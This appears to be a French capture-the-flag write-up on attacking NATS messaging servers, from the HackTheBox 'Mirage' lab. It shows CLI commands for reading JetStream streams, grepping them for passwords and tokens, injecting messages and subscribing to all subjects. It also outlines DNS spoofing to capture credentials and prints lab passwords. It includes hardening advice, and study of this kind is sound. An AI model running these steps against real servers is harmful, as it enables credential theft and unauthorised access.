# NATS (Messaging System)

### <mark style="color:red;">NATS (Messaging System)</mark>

#### <mark style="color:green;">🎯 Qu'est-ce que NATS ?</mark>

**NATS** est un système de messagerie haute performance pour les architectures cloud-native et les microservices.

```
┌─────────────┐         ┌──────────┐         ┌─────────────┐
│ Application │ ------> │   NATS   │ ------> │ Application │
│      A      │ Message │  Server  │ Message │      B      │
└─────────────┘         └──────────┘         └─────────────┘
        Publisher         Message Broker       Subscriber
```

#### <mark style="color:green;">📊 Caractéristiques</mark>

**Port par défaut :** 4222

<mark style="color:orange;">**Concepts clés :**</mark>

```
┌────────────────────────────────────────────┐
│ SUBJECTS (Topics/Canaux)                   │
│ ├─ logs.auth                               │
│ ├─ user.login                              │
│ └─ payment.completed                       │
├────────────────────────────────────────────┤
│ STREAMS (Stockage persistant)              │
│ ├─ Capture des messages                    │
│ ├─ Rétention configurable                  │
│ └─ Lecture multiple fois                   │
├────────────────────────────────────────────┤
│ CONSUMERS (Lecteurs)                       │
│ └─ Lisent depuis les streams               │
└────────────────────────────────────────────┘
```

**JetStream :** Couche de persistance pour NATS

* Stockage des messages sur disque/mémoire
* Garantie de livraison
* Rejeu des messages historiques

#### <mark style="color:green;">🔍 Énumération</mark>

<mark style="color:orange;">**Installation du client NATS**</mark>

```bash
# Via Go
go install github.com/nats-io/natscli/nats@latest

# Vérifier l'installation
nats --version
```

<mark style="color:orange;">**Tester la connexion (sans auth)**</mark>

```bash
# Test basique - Round Trip Time
nats -s nats://target.com:4222 rtt

# Si authentification requise:
nats: Authorization Violation
```

**Se connecter avec credentials**

```bash
# Méthode 1: Options en ligne de commande
nats -s nats://target.com:4222 \
     --user username \
     --password password \
     rtt

# Méthode 2: Créer un contexte (recommandé)
nats context add mycontext \
     -s nats://target.com:4222 \
     --user username \
     --password password

# Utiliser le contexte
nats --context mycontext rtt
```

<mark style="color:orange;">**Énumération des ressources**</mark>

**Informations du compte :**

```bash
nats account info --context mycontext

# Output important:
Account Information:
    User: Dev_Account_A
    Account: dev
    Client IP: 10.10.14.2
    
JetStream Account Information:
    Storage: 570 B
    Streams: 1
    Consumers: 0
```

**Lister les streams :**

```bash
nats stream list --context mycontext

# Output:
╭─────────────────────────────────╮
│           Streams               │
├───────────┬─────────┬──────────┤
│ Name      │ Messages│ Size     │
├───────────┼─────────┼──────────┤
│ auth_logs │ 5       │ 570 B    │
╰───────────┴─────────┴──────────╯
```

**Détails d'un stream :**

```bash
nats stream info auth_logs --context mycontext

# Informations clés:
Subjects: logs.auth          # Canal capturé
Messages: 5                  # Nombre de messages
Bytes: 570 B                 # Taille totale
Storage: File                # Stockage sur disque
Retention: Limits            # Politique de rétention
```

**Lire les messages d'un stream :**

```bash
nats stream view auth_logs --context mycontext

# Output:
[1] Subject: logs.auth Received: 2025-05-05 07:18:56
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

[2] Subject: logs.auth Received: 2025-05-05 07:19:24
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
```

#### 🎯 Attaques courantes

**1. Credential Disclosure via Streams**

Si des credentials sont loggés dans des streams :

```bash
# Chercher des patterns sensibles
nats stream view auth_logs | grep -i "password"
nats stream view auth_logs | grep -i "token"
nats stream view auth_logs | grep -i "secret"
```

**2. Message Injection**

Si on a accès en écriture :

```bash
# Publier un message malveillant
nats pub logs.auth '{"user":"admin","action":"malicious"}'
```

**3. Subscription Hijacking**

Écouter des messages en temps réel :

```bash
# S'abonner à un sujet
nats sub "logs.*" --context mycontext

# S'abonner à tous les sujets
nats sub ">" --context mycontext
```

#### 🔒 Sécurisation

**Configuration sécurisée (nats-server.conf) :**

```conf
# Authentification requise
authorization {
  users = [
    {user: "app1", password: "$2a$11$..."}  # Bcrypt hash
  ]
}

# Permissions granulaires
accounts {
  APP: {
    users = [
      {user: "app1", password: "..."}
    ]
    jetstream: enabled
    limits: {
      max_streams: 10
      max_consumers: 20
    }
  }
}

# TLS obligatoire
tls {
  cert_file: "/path/to/server-cert.pem"
  key_file: "/path/to/server-key.pem"
  ca_file: "/path/to/ca.pem"
  verify: true
}
```

**Recommandations :**

* Toujours activer l'authentification
* Utiliser TLS pour chiffrer les communications
* Limiter les permissions par compte
* Ne JAMAIS logger de credentials en clair
* Utiliser des tokens JWT pour l'auth
* Monitorer les connexions suspectes

#### 💡 Dans le contexte Mirage

```
1. Service NATS sur DC01:4222
   ├─> Authentification requise
   └─> JetStream activé

2. DNS Record manquant : nats-svc.mirage.htb
   └─> Opportunité pour DNS Spoofing

3. Attaque menée :
   ├─> Créer faux record DNS pointant vers nous
   ├─> Application se connecte à notre faux serveur
   ├─> Capturer credentials dans la requête CONNECT
   └─> Username: Dev_Account_A
       Password: hx5h7F5554fP@1337!

4. Exploitation post-capture :
   ├─> Se connecter au vrai NATS avec les credentials
   ├─> Énumérer les streams
   ├─> Lire le stream "auth_logs"
   └─> Trouver credentials david.jjackson
```

***
